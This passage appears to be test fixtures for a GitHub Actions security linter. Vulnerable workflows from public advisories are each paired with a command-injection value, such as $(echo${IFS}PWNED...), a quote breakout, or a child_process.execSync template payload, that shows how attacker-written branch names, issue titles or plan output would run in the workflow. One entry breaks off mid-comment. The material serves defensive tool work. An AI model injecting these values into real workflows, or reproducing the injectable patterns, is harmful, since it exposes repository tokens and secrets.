    #   API, which holds the titles and the bodies of the open issues, which anyone
    #   who may open an issue writes; the action.yml of the action is not among the
    #   files that the linter reads, so whether an attacker controls the output is
    #   not known. A maintainer starts the run, and the attacker's issue is already
    #   open then.
    # cause: the rule does not yet ask for the action.yml of another repository as
    #   a fact, and does not read what the API returns.
    # attack-value: steps.issues.outputs.data = "x'$(echo${IFS}PWNED>/proc/$$/fd/1)'x"
    # attack-run-behavior: the attacker opens an issue whose title holds the
    #   value; when a maintainer starts the workflow, the script becomes echo
    #   'x'$(echo PWNED>/proc/$$/fd/1)'x' > issues.json, and bash runs the
    #   command substitution outside the quotes, which prints PWNED, with the
    #   token of the job and secrets.GITHUBACTIONS_TOKEN in the environment of the
    #   step before.
    # advisory: https://securitylab.github.com/advisories/GHSL-2024-312_Azure_API_Management_Developer_Portal/
    on:
      workflow_dispatch:
    jobs:
      fetch-issues:
        runs-on: ubuntu-latest
        steps:
          - name: Fetch open issues
            id: issues
            uses: octokit/request-action@v2.x
            with:
              route: GET /repos/Azure/api-management-developer-portal/issues?state=open
            env:
              GITHUB_TOKEN: ${{ secrets.GITHUBACTIONS_TOKEN }}
          - name: Write issues to file
            run: |
              echo '${{ steps.issues.outputs.data }}' > issues.json
    ```

    ```yaml
    # situation: on issue_comment, when the comment is on a pull request and
    #   contains /update-vrt, a step uses gotson/pull-request-comment-branch, and
    #   a later step writes the output head_ref of the step comment-branch into
    #   the ref of git push by ${{ }}. This is update-vrt.yml of
    #   actualbudget/actual (commit c0f9073f35f8cfc3bf29810613ea889203672f0d,
    #   lines 1-27, 44-45 and 55). The container of the job, the concurrency of
    #   the workflow, the steps between and the lines of the script before git
    #   push are left out. blossom-ci.yml of NVIDIA/spark-rapids (commit
    #   6c020cca952f87ed35e7aae6be894f34987758a5, GHSL-2020-239) and
    #   android-debug-artifact-ondemand.yml of TeamAmaze/AmazeFileManager
    #   (commit 2d0c8eccc1c77f4cd7d5cc287b771c2b05ddcb08, GHSL-2021-046) have the
    #   same form on issue_comment: octokit/request-action gets the pull request
    #   of the comment from the API, and a run writes
    #   fromJson of the output data's head.ref into its script (line 51 and line
    #   24). zwave-js-bot.yml of zwave-js/zwavejs2mqtt (commit
    #   e758e76c3a7015d9a8cbb901e344dfba00a25d82, GHSL-2021-047) gets the pull
    #   request with actions/github-script and writes the title of the pull
    #   request from fromJSON of the output result into git commit -m (line
    #   281). shadow-pr.yml of hasura/graphql-engine (commit
    #   64a0a14fe2358aa790df7e371af98a411abc2319, GHSL-2021-031), on
    #   pull_request_target, sets the output ossPrTitle to the title of the pull
    #   request in actions/github-script, and a later actions/github-script
    #   writes the output into its script (line 135).
    # reason: the output head_ref of the action is the name of the head branch
    #   of the pull request, which the author of the pull request writes; the
    #   rule does not know what an output of an action of another repository
    #   holds.
    # cause: the rule does not yet ask for the action.yml of another repository
    #   as a fact.
    # attack-value: steps.comment-branch.outputs.head_ref = "x$(echo${IFS}PWNED>/proc/$$/fd/1)"
    # attack-run-behavior: when the action sets the output head_ref to the name
    #   of the head branch, bash runs the command substitution in the name
    #   before git push runs; $$ is the ID of the process of the script, so the step
    #   prints PWNED. A name of a branch can hold $, ( and ) but no space, so
    #   the value uses ${IFS} for the space.
    # advisory: https://securitylab.github.com/advisories/GHSL-2024-325_GHSL-2024-326_Actual/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-239-NVIDIA-spark-rapids-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2021-046-TeamAmaze-AmazeFileManager-workflows/
    # advisory: https://securitylab.github.com/advisories/GHSL-2021-047-zwave-js-zwavejs2mqtt-workflows/
    # advisory: https://securitylab.github.com/advisories/GHSL-2021-031-hasura-graphql-engine-workflows/
    on:
      issue_comment:
        types: [created]
    permissions:
      pull-requests: write
      contents: write
    jobs:
      update-vrt:
        runs-on: ubuntu-latest
        if: |
          github.event.issue.pull_request &&
          contains(github.event.comment.body, '/update-vrt')
        steps:
          - name: Get PR branch
            uses: gotson/pull-request-comment-branch@head-repo-owner-dist
            id: comment-branch
          - name: Commit and push changes
            run: |
              git push origin HEAD:${{ steps.comment-branch.outputs.head_ref }}
    ```
  - example: step-output-remote-action.ghsl-2025-087.yml (workflow, inconclusive)
    ```yaml
    # situation: two jobs write an output of an action of another repository into
    #   a run script by ${{ }}, in the forms of two advisories. The job docs is
    #   docs_pr_comment.yml of PX4/PX4-Autopilot (commit
    #   8c6337e94eccfdd4dc8bce3df10b644ed16d72ba, lines 2-13, 45-49 and 57-59): on
    #   workflow_run, juliangruber/read-file-action reads
    #   errorsFilteredByPrPages.md, a file of the artifact of the run of
    #   docs_flaw_checker.yml on pull_request_target, and a step echoes the content.
    #   The download of the artifact with actions/github-script and unzip (lines
    #   14-36) and the steps after line 59 are left out. The job branch is the form
    #   of GHSA-gq52-6phf-x2r6: on pull_request_target, tj-actions/branch-names
    #   v8.2.1 gives the name of the head branch in its output head_ref_branch, and
    #   a step echoes the output, as the proof of concept of the advisory does
    #   ("Running on pr: $(…)").
    #   ci-failure-comment.yml of monkeytypegame/monkeytype (commit
    #   1838816bff756453290d558ba913ef907cd3dae6, GHSL-2024-167) has the form of
    #   the job docs: juliangruber/read-file-action reads pr_num.txt of the artifact
    #   of the triggering workflow_run, and actions/github-script writes the output
    #   content into its script (line 34).
    # reason: the outputs are what the two actions set, and the action.yml of each
    #   action is not among the files that the linter reads, so whether an attacker
    #   controls an output is not known. markdown_link_checker_sc writes the path of
    #   each page with a broken link into errorsFilteredByPrPages.md unchanged
    #   (src/output_errors.js of version 0.0.138, line 46), and the author of the
    #   pull request names the files of the pull request; tj-actions/branch-names
    #   before 9.0.0 unescapes the escaped name of the branch with eval printf
    #   before the action writes the name to its output (the advisory).
    # cause: the rule does not yet ask for the action.yml of another repository as
    #   a fact, and does not read what an action does with a file.
    # attack-value: steps.read-errors-by-page.outputs.content = "\"; echo PWNED; echo \""
    # attack-run-behavior: the author of a pull request from a fork adds a page
    #   whose name holds the value and that has a broken link, and the file of the
    #   artifact holds the name. The script of the step File detail info becomes
    #   echo ""; echo PWNED; echo "", and bash runs the second echo as a command,
    #   which prints PWNED, with the token of the job. In the job branch, the name
    #   of the head branch of the pull request goes into the output head_ref_branch
    #   and into the script the same way.
    # advisory: https://securitylab.github.com/advisories/GHSL-2025-087_PX4_PX4-Autopilot/
    # advisory: https://github.com/advisories/GHSA-gq52-6phf-x2r6
    # advisory: https://securitylab.github.com/advisories/GHSL-2024-167_monkeytype/
    on:
      workflow_run:
        workflows: ["Docs - Check for flaws in PX4 Guide Source"]
        types: [completed]
      pull_request_target:
    jobs:
      docs:
        if: github.event_name == 'workflow_run'
        permissions:
          pull-requests: write
        runs-on: ubuntu-latest
        steps:
          - name: Read errorsFilteredByPrPages.md file
            id: read-errors-by-page
            uses: juliangruber/read-file-action@v1
            with:
              path: ./errorsFilteredByPrPages.md
          - name: File detail info
            run: |
              echo "${{ steps.read-errors-by-page.outputs.content }}"
      branch:
        if: github.event_name == 'pull_request_target'
        runs-on: ubuntu-latest
        steps:
          - id: branch
            uses: tj-actions/branch-names@dde14ac574a8b9b1cedc59a1cf312788af43d8d8 # v8.2.1
          - run: |
              echo "Running on pr: ${{ steps.branch.outputs.head_ref_branch }}"
    ```

    ```yaml
    # situation: the job a sets its output o from the output of its step s,
    #   which a script writes to $GITHUB_OUTPUT; the job b writes
    #   needs.a.outputs.o into its run script by ${{ }}. diff_report.yml of
    #   checkstyle/checkstyle (commit 11ce9d3b20c951741c5518ec6a967c407ee54e14,

    # attack-run-behavior: when the step s writes o with the value to
    ```

  - example: job-output.ghsa-f9qj-7gh3-mhj4.yml (workflow, inconclusive)
    ```yaml
    # situation: a reusable workflow with no caller among the files that the
    #   linter reads. The job terraform_plan runs terraform plan on the code of the
    #   repository and sets its output plan_stdout from the step output stdout,
    #   which the step writes from the output of terraform plan; the job
    #   update_pr writes needs.terraform_plan.outputs.plan_stdout into the script
    #   of actions/github-script, inside a JavaScript template string, by ${{ }}.
    #   The jobs are .github/workflows/run-terraform.yml of
    #   kartverket/github-workflows (commit
    #   f1d9eac96bc37a19b81a465ef221f14195a8b974, the base of the fix
    #   kartverket/github-workflows#19, lines 125-141, 188-211, 228-240 and
    #   276-282); the inputs, the other steps, the escapes of the plan, the
    #   comment that the script builds around the plan, the job terraform_check
    #   (the job named update_pr here has needs: [terraform_check, terraform_plan])
    #   and the if of the job (github.event_name == 'pull_request', line 221) are
    #   left out, and the job update_github is named update_pr.
    # reason: the value is what another job computes at run time, so whether an
    #   attacker controls it is not known. The advisory says that "a malicious
    #   actor could potentially send a PR with a malicious payload leading to
    #   execution of arbitrary JavaScript code": the output of terraform plan
    #   holds what the code of the pull request makes it print.
    # cause: the rule does not yet follow the output of a job back to what sets
    #   it, and does not read what terraform plan prints.
    # attack-value: needs.terraform_plan.outputs.plan_stdout = "${require('child_process').execSync('echo PWNED')}"
    # attack-run-behavior: when the plan prints the value, the script of the job
    #   update_pr holds it inside a template string, and node.js runs the
    #   JavaScript in ${ }, which starts echo PWNED, with the token of the job.
    # advisory: https://github.com/advisories/GHSA-f9qj-7gh3-mhj4
    on: workflow_call
    jobs:
      terraform_plan:
        runs-on: ubuntu-latest
        outputs:
          plan_stdout: ${{ steps.plan.outputs.stdout }}
        steps:
          - uses: actions/checkout@v3
          - name: Terraform Plan
            id: plan
            run: |
              terraform plan -input=false -no-color -detailed-exitcode | tee output.txt
              STDOUT="$(sed '/^::/d' output.txt | grep -v 'Refreshing state...')"
              STDOUT="${STDOUT//'%'/'%25'}"
              STDOUT="${STDOUT//$'\n'/'%0A'}"
              STDOUT="${STDOUT//$'\r'/'%0D'}"
              echo "::set-output name=stdout::$STDOUT"
      update_pr:
        needs: terraform_plan
        runs-on: ubuntu-latest
        steps:
          - name: Update Pull Request
            uses: actions/github-script@v6
            with:
              github-token: ${{ secrets.GITHUB_TOKEN }}
              script: |
                const output = `#### Terraform Plan
                ${{ needs.terraform_plan.outputs.plan_stdout }}
                `;
                console.log(output);
    ```
